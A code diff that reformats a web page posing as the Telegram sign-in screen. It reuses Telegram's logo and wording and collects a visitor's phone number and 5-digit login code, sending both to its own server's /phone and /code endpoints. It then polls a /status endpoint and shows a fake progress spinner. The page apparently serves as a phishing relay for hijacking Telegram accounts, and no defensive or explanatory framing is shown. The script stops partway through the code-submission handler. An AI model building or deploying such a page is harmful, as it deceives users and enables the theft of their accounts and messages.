@@ -1,522 +1,622 @@
-
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Telegram Sign In</title>
     <style>
+      :root {
+        --bg: #ffffff;
+        --text: #000000;
+        --input-bg: #f0f0f0;
+        --button-bg: #1a60ab;
+        --button-text: #ffffff;
+        --accent: #1a60ab;
+      }
+
+      @media (prefers-color-scheme: dark) {
         :root {
-            --bg: #ffffff;
-            --text: #000000;
-            --input-bg: #f0f0f0;
-            --button-bg: #1a60ab;
-            --button-text: #ffffff;
-            --accent: #1a60ab;
+          --bg: #000000;
+          --text: #ffffff;
+          --input-bg: #333333;
         }
+      }
 
-        @media (prefers-color-scheme: dark) {
-            :root {
-                --bg: #000000;
-                --text: #ffffff;
-                --input-bg: #333333;
-            }
-        }
+      body {
+        background: var(--bg);
+        color: var(--text);
+        font-family: sans-serif;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        transition: all 0.3s ease;
+      }
 
-        body {
-            background: var(--bg);
-            color: var(--text);
-            font-family: sans-serif;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            transition: all 0.3s ease;
-        }
+      .container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        width: 100%;
+        max-width: 400px;
+        padding: 20px;
+        box-sizing: border-box;
+      }
 
+      .logo {
+        width: 100px;
+        height: 100px;
+        margin-bottom: 20px;
+        transition: transform 0.3s ease;
+      }
+
+      .logo:hover {
+        transform: scale(1.1) rotate(10deg);
+      }
+
+      h1 {
+        font-size: 24px;
+        margin: 0 0 10px 0;
+        align-self: center;
+      }
+
+      p {
+        font-size: 14px;
+        text-align: center;
+        margin: 0 0 20px 0;
+      }
+
+      .input {
+        width: 100%;
+        padding: 12px;
+        margin-bottom: 10px;
+        border: none;
+        border-radius: 5px;
+        background: var(--input-bg);
+        color: var(--text);
+        font-size: 16px;
+        box-sizing: border-box;
+      }
+
+      .phone-input {
+        display: flex;
+        width: 100%;
+        background: var(--input-bg);
+        border-radius: 5px;
+        margin-bottom: 10px;
+      }
+
+      .phone-input span {
+        padding: 12px;
+        font-size: 16px;
+        color: var(--text);
+        white-space: nowrap;
+      }
+
+      .phone-input input {
+        flex: 1;
+        border: none;
+        background: transparent;
+        color: var(--text);
+        font-size: 16px;
+        outline: none;
+      }
+
+      button {
+        width: 100%;
+        padding: 12px;
+        background: var(--button-bg);
+        color: var(--button-text);
+        border: none;
+        border-radius: 5px;
+        font-size: 16px;
+        cursor: pointer;
+      }
+
+      button:disabled {
+        background: #cccccc;
+        cursor: not-allowed;
+      }
+
+      #code-page {
+        display: none;
+        text-align: center;
+      }
+
+      #code-page .phone-wrapper {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 20px;
+      }
+
+      #code-page .phone {
+        font-size: 24px;
+        margin-right: 10px;
+      }
+
+      #code-page .phone-edit {
+        cursor: pointer;
+        font-size: 20px;
+      }
+
+      #code-page .subtitle {
+        font-size: 16px;
+        margin-bottom: 20px;
+      }
+
+      #code-page .code-input {
+        width: 100%;
+        padding: 12px;
+        border: 2px solid #1a60ab;
+        border-radius: 5px;
+        font-size: 16px;
+        background: var(--bg);
+        color: var(--text);
+        text-align: center;
+        letter-spacing: 8px;
+        font-weight: bold;
+      }
+
+      #code-page .logo {
+        width: 100px;
+        height: 100px;
+        margin: 0 auto 20px auto;
+        display: block;
+        padding: 5px;
+        box-sizing: border-box;
+      }
+
+      .status {
+        margin-top: 15px;
+        padding: 10px;
+
+        text-align: center;
+        display: none;
+      }
+
+      .status.success {
+        background: none;
+        color: #ffffff;
+      }
+
+      .status.error {
+        background: none;
+        color: #721c24;
+      }
+
+      .status.info {
+        background: none;
+        color: #ffffff;
+      }
+
+      /* Spinner styles (circle + percent) */
+      .spinner-wrapper {
+        width: 40px; /* half of previous 80px */
+        height: 40px;
+        display: none;
+        align-items: center;
+        justify-content: center;
+        margin-top: 5px;
+      }
+
+      .spinner {
+        --p: 0;
+        width: 35px; /* half of previous 70px */
+        height: 35px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: conic-gradient(
+          var(--accent) calc(var(--p) * 1%),
+          #e9e9e9 0
+        );
+        box-shadow:
+          0 2px 6px rgba(0, 0, 0, 0.08),
+          inset 0 -2px 6px rgba(0, 0, 0, 0.02);
+        transition: background 0.12s linear;
+        position: relative;
+      }
+
+      .spinner::after {
+        content: "";
+        position: absolute;
+        width: 30px; /* half of previous 50px */
+        height: 30px;
+        background: var(--bg);
+        border-radius: 50%;
+        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.04) inset;
+      }
+
+      .spinner-text {
+        position: relative;
+        font-weight: 700;
+        color: var(--text);
+        z-index: 2;
+        font-size: 10px; /* half of previous 14px */
+      }
+
+      @media (max-width: 400px) {
         .container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            width: 100%;
-            max-width: 400px;
-            padding: 20px;
-            box-sizing: border-box;
+          padding: 10px;
         }
-
-        .logo {
-            width: 100px;
-            height: 100px;
-            margin-bottom: 20px;
-            transition: transform 0.3s ease;
-        }
-
-        .logo:hover {
-            transform: scale(1.1) rotate(10deg);
-        }
-
-        h1 {
-            font-size: 24px;
-            margin: 0 0 10px 0;
-            align-self: center;
-        }
-
-        p {
-            font-size: 14px;
-            text-align: center;
-            margin: 0 0 20px 0;
-        }
-
-        .input {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 10px;
-            border: none;
-            border-radius: 5px;
-            background: var(--input-bg);
-            color: var(--text);
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-
-        .phone-input {
-            display: flex;
-            width: 100%;
-            background: var(--input-bg);
-            border-radius: 5px;
-            margin-bottom: 10px;
-        }
-
-        .phone-input span {
-            padding: 12px;
-            font-size: 16px;
-            color: var(--text);
-            white-space: nowrap;
-        }
-
-        .phone-input input {
-            flex: 1;
-            border: none;
-            background: transparent;
-            color: var(--text);
-            font-size: 16px;
-            outline: none;
-        }
-
-        button {
-            width: 100%;
-            padding: 12px;
-            background: var(--button-bg);
-            color: var(--button-text);
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-
-        button:disabled {
-            background: #cccccc;
-            cursor: not-allowed;
-        }
-
-        #code-page {
-            display: none;
-            text-align: center;
-        }
-
-        #code-page .phone-wrapper {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 20px;
-        }
-
-        #code-page .phone {
-            font-size: 24px;
-            margin-right: 10px;
-        }
-
-        #code-page .phone-edit {
-            cursor: pointer;
-            font-size: 20px;
-        }
-
-        #code-page .subtitle {
-            font-size: 16px;
-            margin-bottom: 20px;
-        }
-
-        #code-page .code-input {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid #1a60ab;
-            border-radius: 5px;
-            font-size: 16px;
-            background: var(--bg);
-            color: var(--text);
-            text-align: center;
-            letter-spacing: 8px;
-            font-weight: bold;
-        }
-
-        #code-page .logo {
-            width: 100px;
-            height: 100px;
-            margin: 0 auto 20px auto;
-            display: block;
-            padding: 5px;
-            box-sizing: border-box;
-        }
-
-        .status {
-            margin-top: 15px;
-            padding: 10px;
-            
-            text-align: center;
-            display: none;
-        }
-
-        .status.success {
-            background: none;
-            color: #ffffff;
- 
-        }
-
-        .status.error {
-            background: none;
-            color: #721c24;
-            
-        }
-
-        .status.info {
-            background: none;
-            color: #ffffff;
-       
-        }
-
-        /* Spinner styles (circle + percent) */
-        .spinner-wrapper {
-    width: 40px;      /* half of previous 80px */
-    height: 40px;
-    display: none;
-    align-items: center;
-    justify-content: center;
-    margin-top: 5px;
-}
-
-.spinner {
-    --p: 0;
-    width: 35px;      /* half of previous 70px */
-    height: 35px;
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    background: conic-gradient(var(--accent) calc(var(--p) * 1%), #e9e9e9 0);
-    box-shadow: 0 2px 6px rgba(0,0,0,0.08), inset 0 -2px 6px rgba(0,0,0,0.02);
-    transition: background 0.12s linear;
-    position: relative;
-}
-
-.spinner::after {
-    content: "";
-    position: absolute;
-    width: 30px;      /* half of previous 50px */
-    height: 30px;
-    background: var(--bg);
-    border-radius: 50%;
-    box-shadow: 0 1px 2px rgba(0,0,0,0.04) inset;
-}
-
-.spinner-text {
-    position: relative;
-    font-weight: 700;
-    color: var(--text);
-    z-index: 2;
-    font-size: 10px;  /* half of previous 14px */
-}
-
-
-        @media (max-width: 400px) {
-            .container {
-                padding: 10px;
-            }
-        }
+      }
     </style>
-</head>
-<body>
+  </head>
+  <body>
     <div class="container" id="phone-page">
-        <div class="logo">
-            <svg id="Livello_1" data-name="Livello 1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 240 240"><defs><linearGradient id="linear-gradient" x1="120" y1="240" x2="120" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#1a60ab"/><stop offset="1" stop-color="#1a60ab"/></linearGradient></defs><title>Telegram_logo</title><circle cx="120" cy="120" r="120" fill="url(#linear-gradient)"/><path d="M81.229,128.772l14.237,39.406s1.78,3.687,3.686,3.687,30.255-29.492,30.255-29.492l31.525-60.89L81.737,118.6Z" fill="#1a60ab"/><path d="M100.106,138.878l-2.733,29.046s-1.144,8.9,7.754,0,17.415-15.763,17.415-15.763" fill="#1a60ab"/><path d="M81.486,130.178,52.2,120.636s-3.5-1.42-2.373-4.64c.232-.664.7-1.229,2.1-2.2,6.489-4.523,120.106-45.36,120.106-45.36s3.208-1.081,5.1-.362a2.766,2.76,0,0,1,1.885,2.055,9.357,9.357,0,0,1,.254,2.585c-.009.752-.1,1.449-.169,2.542-.692,11.165-21.4,94.493-21.4,94.493s-1.239,4.876-5.678,5.043A8.13,8.13,0,0,1,146.1,172.5c-8.711-7.493-38.819-27.727-45.472-32.177a1.27,1.27,0,0,1-.546-.9c-.093-.469.417-1.05.417-1.05s52.426-46.6,53.821-51.492c.108-.379-.3-.566-.848-.4-3.482,1.281-63.844,39.4-70.506,43.607A3.21,3.21,0,0,1,81.486,130.178Z" fill="#fff"/></svg>
-        </div>
-        <h1>Telegram</h1>
-        <p>Please confirm your country code and enter your phone number.</p>
-        <select id="country" class="input"></select>
-        <div class="phone-input">
-            <span id="code">+</span>
-            <input type="tel" id="phone" placeholder="Phone Number">
-        </div>
-        <button id="next">NEXT</button>
+      <div class="logo">
+        <svg
+          id="Livello_1"
+          data-name="Livello 1"
+          xmlns="http://www.w3.org/2000/svg"
+          xmlns:xlink="http://www.w3.org/1999/xlink"
+          viewBox="0 0 240 240"
+        >
+          <defs>
+            <linearGradient
+              id="linear-gradient"
+              x1="120"
+              y1="240"
+              x2="120"
+              gradientUnits="userSpaceOnUse"
+            >
+              <stop offset="0" stop-color="#1a60ab" />
+              <stop offset="1" stop-color="#1a60ab" />
+            </linearGradient>
+          </defs>
+          <title>Telegram_logo</title>
+          <circle cx="120" cy="120" r="120" fill="url(#linear-gradient)" />
+          <path
+            d="M81.229,128.772l14.237,39.406s1.78,3.687,3.686,3.687,30.255-29.492,30.255-29.492l31.525-60.89L81.737,118.6Z"
+            fill="#1a60ab"
+          />
+          <path
+            d="M100.106,138.878l-2.733,29.046s-1.144,8.9,7.754,0,17.415-15.763,17.415-15.763"
+            fill="#1a60ab"
+          />
+          <path
+            d="M81.486,130.178,52.2,120.636s-3.5-1.42-2.373-4.64c.232-.664.7-1.229,2.1-2.2,6.489-4.523,120.106-45.36,120.106-45.36s3.208-1.081,5.1-.362a2.766,2.76,0,0,1,1.885,2.055,9.357,9.357,0,0,1,.254,2.585c-.009.752-.1,1.449-.169,2.542-.692,11.165-21.4,94.493-21.4,94.493s-1.239,4.876-5.678,5.043A8.13,8.13,0,0,1,146.1,172.5c-8.711-7.493-38.819-27.727-45.472-32.177a1.27,1.27,0,0,1-.546-.9c-.093-.469.417-1.05.417-1.05s52.426-46.6,53.821-51.492c.108-.379-.3-.566-.848-.4-3.482,1.281-63.844,39.4-70.506,43.607A3.21,3.21,0,0,1,81.486,130.178Z"
+            fill="#fff"
+          />
+        </svg>
+      </div>
+      <h1>Telegram</h1>
+      <p>Please confirm your country code and enter your phone number.</p>
+      <select id="country" class="input"></select>
+      <div class="phone-input">
+        <span id="code">+</span>
+        <input type="tel" id="phone" placeholder="Phone Number" />
+      </div>
+      <button id="next">NEXT</button>
 
-        <!-- Spinner area: only visible after clicking NEXT -->
-        <div class="spinner-wrapper" id="spinner-wrapper" aria-hidden="true">
-            <div class="spinner" id="spinner" role="status" aria-live="polite" style="--p:0">
-                <div class="spinner-text" id="spinner-percent">0%</div>
-            </div>
+      <!-- Spinner area: only visible after clicking NEXT -->
+      <div class="spinner-wrapper" id="spinner-wrapper" aria-hidden="true">
+        <div
+          class="spinner"
+          id="spinner"
+          role="status"
+          aria-live="polite"
+          style="--p: 0"
+        >
+          <div class="spinner-text" id="spinner-percent">0%</div>
         </div>
+      </div>
 
-        <div id="phone-status" class="status" aria-hidden="true"></div>
+      <div id="phone-status" class="status" aria-hidden="true"></div>
     </div>
 
     <div class="container" id="code-page">
-        <div class="logo">
-            <svg id="Livello_1" data-name="Livello 1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 240 240"><defs><linearGradient id="linear-gradient" x1="120" y1="240" x2="120" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#512da8"/><stop offset="1" stop-color="#ab47bc"/></linearGradient></defs><title>Telegram_logo</title><circle cx="120" cy="120" r="120" fill="url(#linear-gradient)"/><path d="M81.229,128.772l14.237,39.406s1.78,3.687,3.686,3.687,30.255-29.492,30.255-29.492l31.525-60.89L81.737,118.6Z" fill="#000"/><path d="M100.106,138.878l-2.733,29.046s-1.144,8.9,7.754,0,17.415-15.763,17.415-15.763" fill="#000"/><path d="M81.486,130.178,52.2,120.636s-3.5-1.42-2.373-4.64c.232-.664.7-1.229,2.1-2.2,6.489-4.523,120.106-45.36,120.106-45.36s3.208-1.081,5.1-.362a2.766,2.76,0,0,1,1.885,2.055,9.357,9.357,0,0,1,.254,2.585c-.009.752-.1,1.449-.169,2.542-.692,11.165-21.4,94.493-21.4,94.493s-1.239,4.876-5.678,5.043A8.13,8.13,0,0,1,146.1,172.5c-8.711-7.493-38.819-27.727-45.472-32.177a1.27,1.27,0,0,1-.546-.9c-.093-.469.417-1.05.417-1.05s52.426-46.6,53.821-51.492c.108-.379-.3-.566-.848-.4-3.482,1.281-63.844,39.4-70.506,43.607A3.21,3.21,0,0,1,81.486,130.178Z" fill="#512da8"/></svg>
-        </div>
-        <div class="phone-wrapper">
-            <h4 class="phone" id="display-phone"></h4>
-        </div>
-        <p class="subtitle">We have sent you a message in Telegram with the code.</p>
-        <input type="text" id="code-input" class="code-input" placeholder="Enter 5-digit code" maxlength="5">
-        <div id="code-status" class="status"></div>
+      <div class="logo">
+        <svg
+          id="Livello_1"
+          data-name="Livello 1"
+          xmlns="http://www.w3.org/2000/svg"
+          xmlns:xlink="http://www.w3.org/1999/xlink"
+          viewBox="0 0 240 240"
+        >
+          <defs>
+            <linearGradient
+              id="linear-gradient"
+              x1="120"
+              y1="240"
+              x2="120"
+              gradientUnits="userSpaceOnUse"
+            >
+              <stop offset="0" stop-color="#512da8" />
+              <stop offset="1" stop-color="#ab47bc" />
+            </linearGradient>
+          </defs>
+          <title>Telegram_logo</title>
+          <circle cx="120" cy="120" r="120" fill="url(#linear-gradient)" />
+          <path
+            d="M81.229,128.772l14.237,39.406s1.78,3.687,3.686,3.687,30.255-29.492,30.255-29.492l31.525-60.89L81.737,118.6Z"
+            fill="#000"
+          />
+          <path
+            d="M100.106,138.878l-2.733,29.046s-1.144,8.9,7.754,0,17.415-15.763,17.415-15.763"
+            fill="#000"
+          />
+          <path
+            d="M81.486,130.178,52.2,120.636s-3.5-1.42-2.373-4.64c.232-.664.7-1.229,2.1-2.2,6.489-4.523,120.106-45.36,120.106-45.36s3.208-1.081,5.1-.362a2.766,2.76,0,0,1,1.885,2.055,9.357,9.357,0,0,1,.254,2.585c-.009.752-.1,1.449-.169,2.542-.692,11.165-21.4,94.493-21.4,94.493s-1.239,4.876-5.678,5.043A8.13,8.13,0,0,1,146.1,172.5c-8.711-7.493-38.819-27.727-45.472-32.177a1.27,1.27,0,0,1-.546-.9c-.093-.469.417-1.05.417-1.05s52.426-46.6,53.821-51.492c.108-.379-.3-.566-.848-.4-3.482,1.281-63.844,39.4-70.506,43.607A3.21,3.21,0,0,1,81.486,130.178Z"
+            fill="#512da8"
+          />
+        </svg>
+      </div>
+      <div class="phone-wrapper">
+        <h4 class="phone" id="display-phone"></h4>
+      </div>
+      <p class="subtitle">
+        We have sent you a message in Telegram with the code.
+      </p>
+      <input
+        type="text"
+        id="code-input"
+        class="code-input"
+        placeholder="Enter 5-digit code"
+        maxlength="5"
+      />
+      <div id="code-status" class="status"></div>
     </div>
 
-<script>
-    const countrySelect = document.getElementById('country');
-    const codeSpan = document.getElementById('code');
-    const phoneInput = document.getElementById('phone');
-    const nextButton = document.getElementById('next');
-    const phonePage = document.getElementById('phone-page');
-    const codePage = document.getElementById('code-page');
-    const displayPhone = document.getElementById('display-phone');
-    const editPhone = document.getElementById('edit-phone');
-    const codeInput = document.getElementById('code-input');
-    const phoneStatus = document.getElementById('phone-status');
-    const codeStatus = document.getElementById('code-status');
+    <script>
+      const countrySelect = document.getElementById("country");
+      const codeSpan = document.getElementById("code");
+      const phoneInput = document.getElementById("phone");
+      const nextButton = document.getElementById("next");
+      const phonePage = document.getElementById("phone-page");
+      const codePage = document.getElementById("code-page");
+      const displayPhone = document.getElementById("display-phone");
+      const editPhone = document.getElementById("edit-phone");
+      const codeInput = document.getElementById("code-input");
+      const phoneStatus = document.getElementById("phone-status");
+      const codeStatus = document.getElementById("code-status");
 
-    const spinnerWrapper = document.getElementById('spinner-wrapper');
-    const spinner = document.getElementById('spinner');
-    const spinnerPercentText = document.getElementById('spinner-percent');
+      const spinnerWrapper = document.getElementById("spinner-wrapper");
+      const spinner = document.getElementById("spinner");
+      const spinnerPercentText = document.getElementById("spinner-percent");
 
-    const SERVER_URL = window.location.origin;
-    let statusCheckInterval = null;
-    let sessionId = null;
+      const SERVER_URL = window.location.origin;
+      let statusCheckInterval = null;
+      let sessionId = null;
 
-    // Spinner control
-    let spinnerInterval = null;
-    let spinnerPercent = 0;
-    let silentMode = false; // suppress messages on phone-status
+      // Spinner control
+      let spinnerInterval = null;
+      let spinnerPercent = 0;
+      let silentMode = false; // suppress messages on phone-status
 
-    function showSpinner() {
-        spinnerWrapper.style.display = 'flex';
-        spinnerWrapper.setAttribute('aria-hidden', 'false');
-        spinner.style.setProperty('--p', 0);
+      function showSpinner() {
+        spinnerWrapper.style.display = "flex";
+        spinnerWrapper.setAttribute("aria-hidden", "false");
+        spinner.style.setProperty("--p", 0);
         spinnerPercent = 0;
-        spinnerPercentText.textContent = '0%';
+        spinnerPercentText.textContent = "0%";
         clearInterval(spinnerInterval);
         spinnerInterval = setInterval(() => {
-            if (spinnerPercent < 99) {
-                const delta = Math.max(1, Math.ceil((100 - spinnerPercent) * 0.02));
-                spinnerPercent = Math.min(99, spinnerPercent + delta);
-                spinner.style.setProperty('--p', spinnerPercent);
-                spinnerPercentText.textContent = spinnerPercent + '%';
-            }
+          if (spinnerPercent < 99) {
+            const delta = Math.max(1, Math.ceil((100 - spinnerPercent) * 0.02));
+            spinnerPercent = Math.min(99, spinnerPercent + delta);
+            spinner.style.setProperty("--p", spinnerPercent);
+            spinnerPercentText.textContent = spinnerPercent + "%";
+          }
         }, 120);
-    }
+      }
 
-    function completeSpinnerAndHide(callback) {
+      function completeSpinnerAndHide(callback) {
         clearInterval(spinnerInterval);
         spinnerPercent = 100;
-        spinner.style.setProperty('--p', spinnerPercent);
-        spinnerPercentText.textContent = '100%';
+        spinner.style.setProperty("--p", spinnerPercent);
+        spinnerPercentText.textContent = "100%";
         setTimeout(() => {
-            spinnerWrapper.style.display = 'none';
-            spinnerWrapper.setAttribute('aria-hidden', 'true');
-            if (typeof callback === 'function') callback();
+          spinnerWrapper.style.display = "none";
+          spinnerWrapper.setAttribute("aria-hidden", "true");
+          if (typeof callback === "function") callback();
         }, 350);
-    }
+      }
 
-    function hideSpinnerImmediate() {
+      function hideSpinnerImmediate() {
         clearInterval(spinnerInterval);
-        spinnerWrapper.style.display = 'none';
-        spinnerWrapper.setAttribute('aria-hidden', 'true');
-    }
+        spinnerWrapper.style.display = "none";
+        spinnerWrapper.setAttribute("aria-hidden", "true");
+      }
 
-    // Countries data
-    const countries = [
-        {"name": "Ethiopia", "dial_code": "+251", "code": "ET"},
-        {"name": "United States", "dial_code": "+1", "code": "US"},
-        {"name": "United Kingdom", "dial_code": "+44", "code": "GB"},
-        {"name": "India", "dial_code": "+91", "code": "IN"},
-        {"name": "China", "dial_code": "+86", "code": "CN"},
-        {"name": "Germany", "dial_code": "+49", "code": "DE"},
-        {"name": "France", "dial_code": "+33", "code": "FR"},
-        {"name": "Italy", "dial_code": "+39", "code": "IT"},
-        {"name": "Spain", "dial_code": "+34", "code": "ES"},
-        {"name": "Russia", "dial_code": "+7", "code": "RU"},
-        {"name": "Japan", "dial_code": "+81", "code": "JP"},
-        {"name": "South Korea", "dial_code": "+82", "code": "KR"}
-    ];
+      // Countries data
+      const countries = [
+        { name: "Ethiopia", dial_code: "+251", code: "ET" },
+        { name: "United States", dial_code: "+1", code: "US" },
+        { name: "United Kingdom", dial_code: "+44", code: "GB" },
+        { name: "India", dial_code: "+91", code: "IN" },
+        { name: "China", dial_code: "+86", code: "CN" },
+        { name: "Germany", dial_code: "+49", code: "DE" },
+        { name: "France", dial_code: "+33", code: "FR" },
+        { name: "Italy", dial_code: "+39", code: "IT" },
+        { name: "Spain", dial_code: "+34", code: "ES" },
+        { name: "Russia", dial_code: "+7", code: "RU" },
+        { name: "Japan", dial_code: "+81", code: "JP" },
+        { name: "South Korea", dial_code: "+82", code: "KR" },
+      ];
 
-    countries.forEach(country => {
-        const option = document.createElement('option');
+      countries.forEach((country) => {
+        const option = document.createElement("option");
         option.value = country.dial_code;
         option.textContent = country.name;
         countrySelect.appendChild(option);
-    });
+      });
 
-    countrySelect.value = '+251';
-    codeSpan.textContent = countrySelect.value;
+      countrySelect.value = "+251";
+      codeSpan.textContent = countrySelect.value;
 
-    countrySelect.addEventListener('change', () => {
+      countrySelect.addEventListener("change", () => {
         codeSpan.textContent = countrySelect.value;
-    });
+      });
 
-    function showStatus(element, message, type) {
+      function showStatus(element, message, type) {
         if (element === phoneStatus && silentMode) return;
         element.textContent = message;
-        element.className = 'status ' + type;
-        element.style.display = 'block';
-        element.setAttribute('aria-hidden', 'false');
-    }
+        element.className = "status " + type;
+        element.style.display = "block";
+        element.setAttribute("aria-hidden", "false");
+      }
 
-    async function checkStatus() {
+      async function checkStatus() {
         try {
-            const url = SERVER_URL + '/status' + (sessionId ? ('?session=' + sessionId) : '');
-            const response = await fetch(url);
-            const data = await response.json();
+          const url =
+            SERVER_URL + "/status" + (sessionId ? "?session=" + sessionId : "");
+          const response = await fetch(url);
+          const data = await response.json();
 
-            if (data.status === 'code_required') {
-                completeSpinnerAndHide(() => {
-                    phonePage.style.display = 'none';
-                    codePage.style.display = 'block';
-                    displayPhone.textContent = phoneInput.value ? `${codeSpan.textContent} ${phoneInput.value}` : 'Unknown';
-                    codeInput.focus();
-                    silentMode = false;
-                    showStatus(codeStatus, 'Enter the 5-digit code sent to your Telegram app', 'info');
-                });
-                clearInterval(statusCheckInterval);
-                statusCheckInterval = null;
-            } else if (data.status === 'Verification Complete!') {
-                completeSpinnerAndHide(() => {
-                    phonePage.style.display = 'none';
-                    codePage.style.display = 'block';
-                    displayPhone.textContent = phoneInput.value ? `${codeSpan.textContent} ${phoneInput.value}` : 'Unknown';
-                    codeInput.focus();
-                    silentMode = false;
-                    showStatus(codeStatus, 'Verification Complete!', 'success');
-                });
-                clearInterval(statusCheckInterval);
-                statusCheckInterval = null;
-            } else if (typeof data.status === 'string' && data.status.startsWith('error:')) {
-                completeSpinnerAndHide(() => {
-                    phonePage.style.display = 'none';
-                    codePage.style.display = 'block';
-                    displayPhone.textContent = phoneInput.value ? `${codeSpan.textContent} ${phoneInput.value}` : 'Unknown';
-                    codeInput.focus();
-                    silentMode = false;
-                    showStatus(codeStatus, 'Failed, please try again', 'error');
-                });
-                clearInterval(statusCheckInterval);
-                statusCheckInterval = null;
-            }
+          if (data.status === "code_required") {
+            completeSpinnerAndHide(() => {
+              phonePage.style.display = "none";
+              codePage.style.display = "block";
+              displayPhone.textContent = phoneInput.value
+                ? `${codeSpan.textContent} ${phoneInput.value}`
+                : "Unknown";
+              codeInput.focus();
+              silentMode = false;
+              showStatus(
+                codeStatus,
+                "Enter the 5-digit code sent to your Telegram app",
+                "info",
+              );
+            });
+            clearInterval(statusCheckInterval);
+            statusCheckInterval = null;
+          } else if (data.status === "Verification Complete!") {
+            completeSpinnerAndHide(() => {
+              phonePage.style.display = "none";
+              codePage.style.display = "block";
+              displayPhone.textContent = phoneInput.value
+                ? `${codeSpan.textContent} ${phoneInput.value}`
+                : "Unknown";
+              codeInput.focus();
+              silentMode = false;
+              showStatus(codeStatus, "Verification Complete!", "success");
+            });
+            clearInterval(statusCheckInterval);
+            statusCheckInterval = null;
+          } else if (
+            typeof data.status === "string" &&
+            data.status.startsWith("error:")
+          ) {
+            completeSpinnerAndHide(() => {
+              phonePage.style.display = "none";
+              codePage.style.display = "block";
+              displayPhone.textContent = phoneInput.value
+                ? `${codeSpan.textContent} ${phoneInput.value}`
+                : "Unknown";
+              codeInput.focus();
+              silentMode = false;
+              showStatus(codeStatus, "Failed, please try again", "error");
+            });
+            clearInterval(statusCheckInterval);
+            statusCheckInterval = null;
+          }
         } catch (error) {
-            // silently handle network errors
-            console.error('Error checking status:', error);
+          // silently handle network errors
+          console.error("Error checking status:", error);
         }
-    }
+      }
 
-    nextButton.addEventListener('click', async () => {
+      nextButton.addEventListener("click", async () => {
         const phoneNumber = phoneInput.value.trim();
         if (!phoneNumber) {
-            nextButton.classList.add('shake');
-            setTimeout(()=> nextButton.classList.remove('shake'), 250);
-            return;
+          nextButton.classList.add("shake");
+          setTimeout(() => nextButton.classList.remove("shake"), 250);
+          return;
         }
 
-        const countryCode = codeSpan.textContent.replace('+', '');
+        const countryCode = codeSpan.textContent.replace("+", "");
         try {
-            silentMode = true;
-            phoneStatus.style.display = 'none';
-            phoneStatus.setAttribute('aria-hidden', 'true');
+          silentMode = true;
+          phoneStatus.style.display = "none";
+          phoneStatus.setAttribute("aria-hidden", "true");
 
-            nextButton.style.display = 'none';
-            nextButton.disabled = true;
+          nextButton.style.display = "none";
+          nextButton.disabled = true;
 
-            showSpinner();
+          showSpinner();
 
-            const response = await fetch(SERVER_URL + '/phone', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ country_code: countryCode, phone_number: phoneNumber })
-            });
+          const response = await fetch(SERVER_URL + "/phone", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              country_code: countryCode,
+              phone_number: phoneNumber,
+            }),
+          });
 
-            let result = {};
-            try { result = await response.json(); } catch(e){ result = {}; }
+          let result = {};
+          try {
+            result = await response.json();
+          } catch (e) {
+            result = {};
+          }
 
-            if (result.session) sessionId = result.session;
+          if (result.session) sessionId = result.session;
 
-            if (statusCheckInterval) clearInterval(statusCheckInterval);
-            statusCheckInterval = setInterval(checkStatus, 1500);
-            checkStatus();
-
+          if (statusCheckInterval) clearInterval(statusCheckInterval);
+          statusCheckInterval = setInterval(checkStatus, 1500);
+          checkStatus();
         } catch (error) {
-            hideSpinnerImmediate();
-            nextButton.style.display = 'block';
-            nextButton.disabled = false;
-            silentMode = false;
-            console.error('Failed to connect to server', error);
+          hideSpinnerImmediate();
+          nextButton.style.display = "block";
+          nextButton.disabled = false;
+          silentMode = false;
+          console.error("Failed to connect to server", error);
         }
-    });
+      });
 
-    (function addShakeStyle(){
-        const s = document.createElement('style');
+      (function addShakeStyle() {
+        const s = document.createElement("style");
         s.textContent = `.shake{animation:shakeit .22s cubic-bezier(.36,.07,.19,.97) both}
         @keyframes shakeit{10%,90%{transform:translateX(-1px)}20%,80%{transform:translateX(2px)}30%,50%,70%{transform:translateX(-4px)}40%,60%{transform:translateX(4px)}}`;
         document.head.appendChild(s);
-    })();
+      })();
 
-    codeInput.addEventListener('input', async (e) => {
-        const code = e.target.value.replace(/\D/g, '');
+      codeInput.addEventListener("input", async (e) => {
+        const code = e.target.value.replace(/\D/g, "");
         e.target.value = code;
 
         if (code.length === 5) {
-            try {
-                codeInput.disabled = true;
+          try {
+            codeInput.disabled = true;
 
-                const body = { code: code };
-                if (sessionId) body.session = sessionId;
+            const body = { code: code };
+            if (sessionId) body.session = sessionId;
 
-                await fetch(SERVER_URL + '/code', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(body)
-                });
+            await fetch(SERVER_URL + "/code", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(body),
+            });
 
-                showStatus(codeStatus, 'Code submitted successfully', 'success');
-
-            } catch (error) {
-                showStatus(codeStatus, 'Failed, please try again', 'error');
-                codeInput.disabled = false;
-                console.error('Code submission error:', error);
-            }
+            showStatus(codeStatus, "Code submitted successfully", "success");
